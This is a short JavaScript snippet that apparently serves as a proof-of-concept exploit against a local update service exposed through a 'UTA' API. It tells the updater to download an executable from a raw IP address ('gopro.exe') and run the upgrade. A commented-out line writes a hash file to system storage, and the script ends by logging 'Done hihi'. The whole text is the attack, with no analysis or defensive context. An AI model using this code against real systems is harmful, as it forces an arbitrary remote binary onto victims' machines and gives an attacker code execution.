UTA.Update.UpdateBinaryInitiate('http://35.229.167.231/gopro.exe', '11').then(function (){
  //return UTA.OSServices.writeToSystemStorage('1',1,'https://vinhjaxt.github.io/gopro.sha265.txt?_='+Math.random())
  return 1
}).then(function (){
  return UTA.Update.upgrade('11')
}).then(function (){ console.log('Done hihi') }).catch(alert)
